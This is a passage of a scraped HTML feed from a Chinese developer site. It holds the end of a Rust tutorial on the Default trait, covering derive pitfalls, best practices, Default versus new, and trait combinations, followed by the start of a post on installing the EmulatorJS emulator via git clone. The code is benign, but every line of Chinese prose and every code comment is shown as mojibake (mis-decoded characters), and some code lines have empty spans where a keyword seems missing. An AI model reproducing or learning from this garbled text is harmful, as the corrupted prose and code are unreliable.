<p><strong>è®°ä½è¿™ä¸ªçº¦å®š</strong>ï¼š</p>




















<table><thead><tr><th>æ–¹æ³•</th><th>ç”¨é€”</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>new()</code></td><td>å¿…é¡»æä¾›å‚æ•°</td><td><code>Database::new(url)</code></td></tr><tr><td><code>default()</code></td><td>é›¶å‚æ•°ï¼Œåˆç†çš„é»˜è®¤å€¼</td><td><code>Logger::default()</code></td></tr></tbody></table>
<p>å¦‚æœç±»å‹å¿…é¡»æä¾›å‚æ•°æ‰æœ‰æ„ä¹‰ï¼ˆæ¯”å¦‚æ•°æ®åº“è¿æ¥å¿…é¡»æœ‰ URLï¼‰ï¼Œå°±åˆ«å®ç° Defaultã€‚</p>
<h3 data-id="heading-17">å‘ 4ï¼šå­—æ®µæœ‰ä¾èµ–å…³ç³»æ—¶åˆ«æ´¾ç”Ÿ</h3>
<p><strong>é—®é¢˜</strong>ï¼šå­—æ®µä¹‹é—´æœ‰é€»è¾‘å…³ç³»ï¼Œæ´¾ç”Ÿçš„ Default ä¸ä¼šå¤„ç†ã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Default)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Cache</span> {
    data: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">String</span>&gt;,
    count: <span class="hljs-type">usize</span>,  <span class="hljs-comment">// åº”è¯¥ç­‰äº data.len()ï¼Œä½†æ´¾ç”Ÿçš„é»˜è®¤å€¼æ˜¯ 0</span>
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">cache</span> = Cache::<span class="hljs-title function_ invoke__">default</span>();
    <span class="hljs-comment">// cache.data.len() = 0</span>
    <span class="hljs-comment">// cache.count = 0</span>
    <span class="hljs-comment">// ç°åœ¨è¿˜ä¸€è‡´ï¼Œä½†å¦‚æœ data æœ‰åˆå§‹å€¼å°±ä¸ä¸€è‡´äº†</span>
}
</code></pre>
<p><strong>æ›´æ˜æ˜¾çš„ä¾‹å­</strong>ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Default)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Buffer</span> {
    data: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">u8</span>&gt;,
    capacity: <span class="hljs-type">usize</span>,  <span class="hljs-comment">// é»˜è®¤ 0ï¼Œä½† Vec çš„ capacity å¯èƒ½ä¸æ˜¯ 0</span>
}
</code></pre>
<p><strong>æ€ä¹ˆåŠ</strong>ï¼šæ‰‹åŠ¨å®ç°ï¼Œä¿è¯å­—æ®µä¹‹é—´çš„ä¸€è‡´æ€§ã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">Default</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Cache</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">default</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">data</span> = <span class="hljs-type">Vec</span>::<span class="hljs-title function_ invoke__">new</span>();
        Cache {
            count: data.<span class="hljs-title function_ invoke__">len</span>(),  <span class="hljs-comment">// ä¿è¯ä¸€è‡´</span>
            data,
        }
    }
}
</code></pre>
<h2 data-id="heading-18">5 æ¡æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-19">1. èƒ½æ´¾ç”Ÿå°±æ´¾ç”Ÿ</h3>
<p><strong>åŸåˆ™</strong>ï¼šç®€å•ç±»å‹ç›´æ¥æ´¾ç”Ÿï¼Œéœ€è¦è‡ªå®šä¹‰é»˜è®¤å€¼æ‰æ‰‹åŠ¨å®ç°ã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// âœ… ç®€å•ç±»å‹ï¼šæ´¾ç”Ÿ</span>
<span class="hljs-meta">#[derive(Default)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Point</span> {
    x: <span class="hljs-type">i32</span>,
    y: <span class="hljs-type">i32</span>,
}

<span class="hljs-comment">// âœ… éœ€è¦åˆç†é»˜è®¤å€¼ï¼šæ‰‹åŠ¨å®ç°</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Config</span> {
    port: <span class="hljs-type">u16</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Default</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Config</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">default</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        Config { port: <span class="hljs-number">8080</span> }  <span class="hljs-comment">// ä¸æ˜¯ 0</span>
    }
}
</code></pre>
<h3 data-id="heading-20">2. é…åˆ <code>..Default::default()</code> è¯­æ³•</h3>
<p><strong>æŠ€å·§</strong>ï¼šè¿™æ˜¯ Default æœ€å¸¸ç”¨çš„åœºæ™¯ï¼Œçœä»£ç ç¥å™¨ã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Default)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Settings</span> {
    theme: <span class="hljs-type">String</span>,
    font_size: <span class="hljs-type">u32</span>,
    auto_save: <span class="hljs-type">bool</span>,
    <span class="hljs-comment">// ... å¾ˆå¤šå­—æ®µ</span>
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">settings</span> = Settings {
        theme: <span class="hljs-string">"dark"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
        ..<span class="hljs-built_in">Default</span>::<span class="hljs-title function_ invoke__">default</span>()  <span class="hljs-comment">// å…¶ä»–å­—æ®µç”¨é»˜è®¤å€¼</span>
    };
}
</code></pre>
<h3 data-id="heading-21">3. å…¬å…± API æœ€å¥½æä¾› Default</h3>
<p><strong>åŸå› </strong>ï¼šè®©ç”¨æˆ·æ›´æ–¹ä¾¿ï¼Œä¸ç”¨è®°ä½æ¯ä¸ªå­—æ®µçš„åˆå§‹å€¼ã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// âœ… ç”¨æˆ·å‹å¥½</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">client</span> = HttpClient::<span class="hljs-title function_ invoke__">default</span>();

<span class="hljs-comment">// âŒ ç”¨æˆ·ç—›è‹¦</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">client</span> = HttpClient {
    timeout: <span class="hljs-number">0</span>,
    retries: <span class="hljs-number">0</span>,
    user_agent: <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">new</span>(),
    follow_redirects: <span class="hljs-literal">false</span>,
    <span class="hljs-comment">// ... è¿˜æœ‰ 10 ä¸ªå­—æ®µ</span>
};
</code></pre>
<h3 data-id="heading-22">4. æ–‡æ¡£é‡Œå†™æ¸…æ¥šé»˜è®¤å€¼</h3>
<p><strong>é‡è¦</strong>ï¼šå¦‚æœé»˜è®¤å€¼ä¸æ˜¯ 0 æˆ–ç©ºï¼Œä¸€å®šè¦åœ¨æ–‡æ¡£é‡Œè¯´æ˜ã€‚</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">/// HTTP å®¢æˆ·ç«¯é…ç½®</span>
<span class="hljs-comment">///</span>
<span class="hljs-comment">/// # é»˜è®¤å€¼</span>
<span class="hljs-comment">/// - `timeout`: 30 ç§’</span>
<span class="hljs-comment">/// - `retries`: 3 æ¬¡</span>
<span class="hljs-comment">/// - `user_agent`: "MyApp/1.0"</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">HttpClientConfig</span> {
    timeout: <span class="hljs-type">u64</span>,
    retries: <span class="hljs-type">u32</span>,
    user_agent: <span class="hljs-type">String</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Default</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">HttpClientConfig</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">default</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        HttpClientConfig {
            timeout: <span class="hljs-number">30</span>,
            retries: <span class="hljs-number">3</span>,
            user_agent: <span class="hljs-string">"MyApp/1.0"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
        }
    }
}
</code></pre>
<h3 data-id="heading-23">5. Default vs new æ€ä¹ˆé€‰</h3>
<p><strong>å†³ç­–æ ‘</strong>ï¼š</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// æƒ…å†µ 1ï¼šå¿…é¡»æä¾›å‚æ•° â†’ åªæä¾› new()</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Database</span> {
    url: <span class="hljs-type">String</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Database</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(url: <span class="hljs-type">String</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        Database { url }
    }
}
<span class="hljs-comment">// æ²¡æœ‰ Defaultï¼Œå› ä¸ºæ²¡æœ‰åˆç†çš„é»˜è®¤ URL</span>

<span class="hljs-comment">// æƒ…å†µ 2ï¼šæœ‰åˆç†çš„é»˜è®¤å€¼ â†’ æä¾› Default</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Logger</span> {
    level: <span class="hljs-type">String</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Default</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Logger</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">default</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        Logger {
            level: <span class="hljs-string">"info"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
        }
    }
}

<span class="hljs-comment">// æƒ…å†µ 3ï¼šä¸¤è€…éƒ½æœ‰ â†’ éƒ½æä¾›</span>
<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Logger</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(level: <span class="hljs-type">String</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        Logger { level }
    }
}
</code></pre>
<p><strong>å¿«é€Ÿåˆ¤æ–­</strong>ï¼š</p>

























<table><thead><tr><th>æƒ…å†µ</th><th>æä¾›ä»€ä¹ˆ</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>å¿…é¡»æœ‰å‚æ•°æ‰æœ‰æ„ä¹‰</td><td>åªæä¾› <code>new()</code></td><td>æ•°æ®åº“è¿æ¥ï¼ˆå¿…é¡»æœ‰ URLï¼‰</td></tr><tr><td>æœ‰åˆç†çš„é›¶å‚æ•°é»˜è®¤å€¼</td><td>æä¾› <code>Default</code></td><td>æ—¥å¿—å™¨ï¼ˆé»˜è®¤ info çº§åˆ«ï¼‰</td></tr><tr><td>ä¸¤è€…éƒ½åˆç†</td><td>éƒ½æä¾›</td><td>é…ç½®å¯¹è±¡ï¼ˆå¯ä»¥å…¨é»˜è®¤ï¼Œä¹Ÿå¯ä»¥è‡ªå®šä¹‰ï¼‰</td></tr></tbody></table>
<h2 data-id="heading-24">å’Œå…¶ä»– trait ä¸€èµ·ç”¨</h2>
<p>Default ç»å¸¸å’Œå…¶ä»– trait ç»„åˆæ´¾ç”Ÿï¼Œä¸‹é¢æ˜¯å¸¸è§æ­é…ï¼š</p>
<p><strong>Default + Clone</strong>ï¼šåˆ›å»ºé»˜è®¤å®ä¾‹åå¯ä»¥å…‹éš†</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Default, Clone)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Config</span> {
    value: <span class="hljs-type">i32</span>,
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">c1</span> = Config::<span class="hljs-title function_ invoke__">default</span>();
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">c2</span> = c1.<span class="hljs-title function_ invoke__">clone</span>();  <span class="hljs-comment">// å…‹éš†é»˜è®¤é…ç½®</span>
}
</code></pre>
<p><strong>Default + Debug</strong>ï¼šæ–¹ä¾¿è°ƒè¯•é»˜è®¤å€¼</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Default, Debug)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Point</span> {
    x: <span class="hljs-type">i32</span>,
    y: <span class="hljs-type">i32</span>,
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">p</span> = Point::<span class="hljs-title function_ invoke__">default</span>();
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{:?}"</span>, p);  <span class="hljs-comment">// Point { x: 0, y: 0 }</span>
}
</code></pre>
<p><strong>Default + PartialEq</strong>ï¼šæµ‹è¯•æ—¶éªŒè¯é»˜è®¤å€¼</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#[derive(Default, PartialEq)]</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Data</span> {
    value: <span class="hljs-type">i32</span>,
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">d1</span> = Data::<span class="hljs-title function_ invoke__">default</span>();
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">d2</span> = Data { value: <span class="hljs-number">0</span> };
    <span class="hljs-built_in">assert_eq!</span>(d1, d2);  <span class="hljs-comment">// é»˜è®¤å€¼å’Œæ‰‹åŠ¨æ„é€ çš„ç›¸ç­‰</span>
}
</code></pre>
<blockquote>
<p><strong>å¸¸è§ç»„åˆ</strong>ï¼š<code>#[derive(Default, Debug, Clone, PartialEq)]</code> æ˜¯é…ç½®ç±»å‹çš„æ ‡é…ã€‚</p>
</blockquote>
<h2 data-id="heading-25">æ€»ç»“</h2>
<p>Default å°±ä¸‰å¥è¯ï¼š</p>
<ol>
<li><strong>ä¸€ä¸ªæ–¹æ³•</strong>ï¼š<code>default()</code> è¿”å›åˆç†çš„é»˜è®¤å€¼</li>
<li><strong>ä¸€ä¸ªè¯­æ³•</strong>ï¼š<code>..Default::default()</code> çœæ‰ 90% çš„åˆå§‹åŒ–ä»£ç </li>
<li><strong>ä¸€ä¸ªåŸåˆ™</strong>ï¼šé»˜è®¤å€¼è¦ã€Œå®‰å…¨ä¸”åˆç†ã€ï¼Œä¸æ˜¯éšä¾¿ç»™ä¸ª 0</li>
</ol>
<p><strong>è®°ä½</strong>ï¼šèƒ½æ´¾ç”Ÿå°±æ´¾ç”Ÿï¼Œéœ€è¦è‡ªå®šä¹‰å°±æ‰‹åŠ¨å®ç°ã€‚é…ç½®å¯¹è±¡ã€Builder æ¨¡å¼ã€Option å…œåº•ï¼ŒDefault éƒ½èƒ½å¸®ä½ çœä»£ç ã€‚</p>
<p>ä¸‹æ¬¡å†™ç»“æ„ä½“æ—¶ï¼Œé—®è‡ªå·±ä¸€å¥ï¼šã€Œè¿™ä¸ªç±»å‹æœ‰åˆç†çš„é»˜è®¤å€¼å—ï¼Ÿã€æœ‰çš„è¯ï¼ŒåŠ ä¸ª <code>#[derive(Default)]</code>ï¼Œä½ çš„ç”¨æˆ·ä¼šæ„Ÿè°¢ä½ çš„ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ€€æ—§æ¸¸æˆæ¨¡æ‹Ÿå™¨ï¼Œæˆ‘é€‰EmulatorJS]]></title>    <link>https://juejin.cn/post/7596905751111073855</link>    <guid>https://juejin.cn/post/7596905751111073855</guid>    <pubDate>2026-01-19T17:37:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596905751111073855" data-draft-id="7596934200580620324" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ€€æ—§æ¸¸æˆæ¨¡æ‹Ÿå™¨ï¼Œæˆ‘é€‰EmulatorJS"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-19T17:37:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¾·è‚²å¤„ä¸»ä»»"/> <meta itemprop="url" content="https://juejin.cn/user/2673620576140030"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ€€æ—§æ¸¸æˆæ¨¡æ‹Ÿå™¨ï¼Œæˆ‘é€‰EmulatorJS
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2673620576140030/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¾·è‚²å¤„ä¸»ä»»
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T17:37:49.000Z" title="Mon Jan 19 2026 17:37:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>ç‚¹èµ + å…³æ³¨ + æ”¶è— = å­¦ä¼šäº†</strong></p>
<p>ä½ æœ‰å¤šä¹…æ²¡æ‰“ç”µåŠ¨äº†ï¼Ÿè¿˜è®°å¾—å°æ—¶å€™ç©è¿‡ä»€ä¹ˆæ¸¸æˆå—ï¼Ÿ</p>
<p>æˆ‘æ˜¯90åï¼Œç¬¬ä¸€æ¬¡æ¥è§¦çš„æ¸¸æˆæœºæ˜¯å°éœ¸ç‹ï¼Œç©çš„å°±æ˜¯çº¢ç™½æœºè¿™ä»£çš„æ¸¸æˆã€‚ä½†çœŸæ­£ç»™æˆ‘ç”Ÿæˆæƒ…æ€€çš„è¿˜å¾—æ˜¯ GBAã€‚å£è¢‹å¦–æ€ªçº¢ç»¿è“ã€é‡‘é“¶æ°´æ™¶ï¼Œå†åˆ°åé¢çš„ç«çº¢å¶ç»¿å’Œå„ç§å®çŸ³ï¼›é©¬é‡Œå¥¥èµ›è½¦ï¼›é¾™ç å¤§å†’é™©ï¼›èˆç©ºæ–—å‰§ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/949226e3cb5c4e52982205c0410d064e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449069&amp;x-signature=6goCDvrUKM%2F0t6DfQHRzqd8s7B8%3D" alt="01.png" loading="lazy"/></p>
<p>æ—¶é—´é•¿äº†å¤šå°‘æœ‰ç‚¹æ€€å¿µäº†ã€‚é‚£ä¹ˆæœ‰æ²¡æœ‰ä¸€ç§å¯èƒ½ï¼Œä¸€ä¸ªâ€œå®¢æˆ·ç«¯â€èƒ½åŒ…å«Nå°æ¸¸æˆæœºæ¨¡æ‹Ÿå™¨å‘¢ï¼Ÿæˆ‘æ‰¾åˆ° EmulatorJSã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f31d737de94b4f3b8fb9a8bad0c38f14~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b636IKy5aSE5Li75Lu7:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769449069&amp;x-signature=BsTvVqlzzNF%2F6Bj%2BnqkefsU%2BQ5Q%3D" alt="02.png" loading="lazy"/></p>
<ul>
<li>EmulatorJS GitHub åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FEmulatorJS%2FEmulatorJS" target="_blank" title="https://github.com/EmulatorJS/EmulatorJS" ref="nofollow noopener noreferrer">github.com/EmulatorJS/â€¦</a></li>
<li>EmulatorJS æ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Femulatorjs.org%2F" target="_blank" title="https://emulatorjs.org/" ref="nofollow noopener noreferrer">emulatorjs.org/</a></li>
</ul>
<h2 data-id="heading-0">ä¸‹è½½ EmulatorJS</h2>
<p>åœ¨ç”µè„‘å®‰è£… EmulatorJS çš„æ–¹æ³•å¾ˆç®€å•ã€‚</p>
<p>é¦–å…ˆç”µè„‘éœ€è¦å®‰è£… Node.js ç¯å¢ƒï¼Œæ‰“å¼€ Node.js å®˜ç½‘ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2F%25EF%25BC%2589%25E7%259B%25B4%25E6%258E%25A5%25E4%25B8%258B%25E8%25BD%25BD%25E5%25AE%2589%25E8%25A3%2585%25E5%25A5%25BD%25E5%25B0%25B1%25E8%25A1%258C%25EF%25BC%2588%25E5%25BE%2588%25E7%25AE%2580%25E5%258D%2595%25EF%25BC%258C%25E6%2588%2591%25E4%25B8%258D%25E8%25B4%25B4%25E6%2595%2599%25E7%25A8%258B%25E4%25BA%2586%25EF%25BC%2589%25E3%2580%2582" target="_blank" title="https://nodejs.org/%EF%BC%89%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85%E5%A5%BD%E5%B0%B1%E8%A1%8C%EF%BC%88%E5%BE%88%E7%AE%80%E5%8D%95%EF%BC%8C%E6%88%91%E4%B8%8D%E8%B4%B4%E6%95%99%E7%A8%8B%E4%BA%86%EF%BC%89%E3%80%82" ref="nofollow noopener noreferrer">nodejs.org/ï¼‰ç›´æ¥ä¸‹è½½å®‰è£…å¥½å°±è¡Œï¼ˆâ€¦</a></p>
<p>æ¥ç€æ‰“å¼€ EmulatorJS çš„ä»£ç ä»“åº“ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FEmulatorJS%2FEmulatorJS%25EF%25BC%2589%25EF%25BC%258C%25E7%2594%25A8%25E4%25B8%258B%25E9%259D%25A2%25E8%25BF%2599%25E5%25A5%2597%25E5%2591%25BD%25E4%25BB%25A4%25E6%258A%258A%25E4%25BB%25A3%25E7%25A0%2581%25E5%2585%258B%25E9%259A%2586%25E5%2588%25B0%25E6%259C%25AC%25E5%259C%25B0%25E3%2580%2582" target="_blank" title="https://github.com/EmulatorJS/EmulatorJS%EF%BC%89%EF%BC%8C%E7%94%A8%E4%B8%8B%E9%9D%A2%E8%BF%99%E5%A5%97%E5%91%BD%E4%BB%A4%E6%8A%8A%E4%BB%A3%E7%A0%81%E5%85%8B%E9%9A%86%E5%88%B0%E6%9C%AC%E5%9C%B0%E3%80%82" ref="nofollow noopener noreferrer">github.com/EmulatorJS/â€¦</a></p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> git@github.com:EmulatorJS/EmulatorJS.git
</code></pre>
<p>å¦‚æœä½ ç”µè„‘æ²¡å®‰è£… git å·¥å…·ï¼Œåœ¨æµè§ˆå™¨æ‰“å¼€ EmulatorJS çš„ GitHub åœ°å€ï¼Œä¸‹è½½ ZIP æ–‡ä»¶åˆ°ç”µè„‘ï¼Œç„¶åè§£å‹å°±è¡Œã€‚</p>
